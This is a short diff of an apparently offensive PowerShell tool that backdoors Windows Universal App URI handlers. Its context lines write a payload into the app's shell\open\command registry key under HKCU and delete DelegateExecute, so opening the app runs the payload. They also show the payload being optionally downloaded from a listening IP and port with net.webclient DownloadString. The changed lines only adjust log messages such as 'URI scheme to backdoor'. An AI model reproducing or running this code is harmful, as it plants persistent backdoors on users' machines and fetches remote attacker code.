@@ -18,7 +18,7 @@ Begin {
         New-Item -Path "HKCU:\\Software\Classes\$appxID\shell\open\" -Name "command"
         Write-Host -BackgroundColor Red "Universal App to hijack:"
         Write-Host -BackgroundColor DarkGray "$appxID"
-        Write-Host -BackgroundColor Red "Backdoor payload to use:"
+        Write-Host -BackgroundColor Red "Payload used:"
         Write-Host -BackgroundColor DarkGray "$gadgetPayload $cmdSeparator $defaultHandler"
         Set-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Shell\open\command" -Name "(Default)" -value "$gadgetPayload $cmdSeparator $defaultHandler"
         Remove-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Shell\open\command" -Name "DelegateExecute"
@@ -30,6 +30,7 @@ Process {
 
     $payloadsDetails | ForEach-Object {
         $uriProtocol = $_.UriProtocol;
+        Write-Host -BackgroundColor Green "URI scheme to backdoor: $uriProtocol"
         $gadgetPayload = If ($isOnlineFetch)
         {
             (New-Object net.webclient).DownloadString("http://" + $listeningIp + ":" + $httpPort + "/" + $_.UniqueID)
